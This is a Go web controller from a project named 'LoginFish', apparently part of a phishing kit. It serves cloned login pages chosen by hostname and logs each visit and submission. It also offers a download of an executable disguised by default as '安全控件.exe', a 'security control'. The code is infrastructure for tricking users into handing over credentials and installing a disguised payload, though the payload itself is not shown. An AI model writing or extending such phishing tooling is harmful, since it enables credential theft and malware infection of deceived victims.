package controller

import (
	"LoginFish/pkg/model"
	"strings"

	"github.com/gin-gonic/gin"
)

type Index struct {
}

func (i *Index) Index(c *gin.Context) {
	site := model.GetSite(c.Request.Host)
	if site.ID <= 0 {
		c.String(500, "500")
		return
	}
	model.InsertLog(c, false)
	c.HTML(200, site.Template, gin.H{
		"title": site.Title,
	})
}
func (i *Index) Download(c *gin.Context) {
	site := model.GetSite(c.Request.Host)
	if site.ID <= 0 || site.Download == "" {
		c.String(500, "500")
		return
	}
	model.InsertLog(c, true)
	downloadName := "安全控件.exe"
	filename := strings.Split(site.Download, "__")
	if len(filename) > 1 {
		downloadName = filename[1]
	}
	c.Header("Content-Type", "application/octet-stream")
	c.Header("Content-Disposition", "attachment; filename=\""+downloadName+"\"")
	c.Header("Content-Transfer-Encoding", "binary")
	c.File(site.Download)
}
func (i *Index) Submit(c *gin.Context) {
	site := model.GetSite(c.Request.Host)
	if site.ID <= 0 {
		c.String(500, "500")
		return
	}
	model.InsertLog(c, true)
}
